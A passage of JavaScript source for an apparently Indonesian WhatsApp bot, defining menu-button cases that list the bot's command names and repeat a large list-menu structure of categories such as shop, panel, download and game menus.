        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'fixbutton': {
let teks = `◤─「 \`FITUR FIX\` 」─✦
│⟡ 〔 _.nulis_
│⟡ 〔 _.sertifikatmenu_
│⟡ 〔 _.jadianime_
│⟡ 〔 _.hdvid_
│⟡ 〔 _.ytplay_
│⟡ 〔 _.removebg_
│⟡ 〔 _.terabox_
│⟡ 〔 _.ytmp3_
│⟡ 〔 _.hd_
│⟡ 〔 _.mediafire_
│⟡ 〔 _.xnxxsearch_
│⟡ 〔 _.cuaca_
│⟡ 〔 _.bratvideo_
│⟡ 〔 _.myip_
│⟡ 〔 _.welcome2_
│⟡ 〔 _.reactch_
│⟡ 〔 _.ytmp4_
│⟡ 〔 _.qc_
│⟡ 〔 _.lyrics_
│⟡ 〔 _.yts_
│⟡ 〔 _.paptt_
│⟡ 〔 _.antilink_
│⟡ 〔 _.welcome_
│⟡ 〔 _.changewelcome_
│⟡ 〔 _.rvo_
│⟡ 〔 _.jpm_
│⟡ 〔 _.pushkontak_
│⟡ 〔 _.onlypc_
│⟡ 〔 _.onlygc_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'cpanelbutton': {
let teks = `◤─「 \`PANEL MENU\` 」─✦
│⟡ 〔 _.1gb_
│⟡ 〔 _.2gb_
│⟡ 〔 _.3gb_
│⟡ 〔 _.4gb_
│⟡ 〔 _.5gb_
│⟡ 〔 _.6gb_
│⟡ 〔 _.7g_
│⟡ 〔 _.8gb_
│⟡ 〔 _.9gb_
│⟡ 〔 _.10gb_
│⟡ 〔 _.unli_
│⟡ 〔 _.cadmin_
◣──────────❈
◤─「 \`PANEL-V2 MENU\` 」─✦
│⟡ 〔 _.1gb-v2_
│⟡ 〔 _.2gb-v2_
│⟡ 〔 _.3gb-v2_
│⟡ 〔 _.4gb-v2_
│⟡ 〔 _.5gb-v2_
│⟡ 〔 _.6gb-v2_
│⟡ 〔 _.7gb-v2_
│⟡ 〔 _.8gb-v2_
│⟡ 〔 _.9gb-v2_
│⟡ 〔 _.10gb-v2_
│⟡ 〔 _.unli-v2_
│⟡ 〔 _.cadmin-v2_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'shopmenubutton': {
let teks = `◤─「 \`SHOP MENU\` 」─✦
│⟡ 〔 _.belipanel_
│⟡ 〔 _.shopmenu_
│⟡ 〔 _.deposit_
│⟡ 〔 _.addsaldo_
│⟡ 〔 _.ceksaldo_
│⟡ 〔 _.buypanel_
│⟡ 〔 _.takesaldo_
│⟡ 〔 _.resetsaldo_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
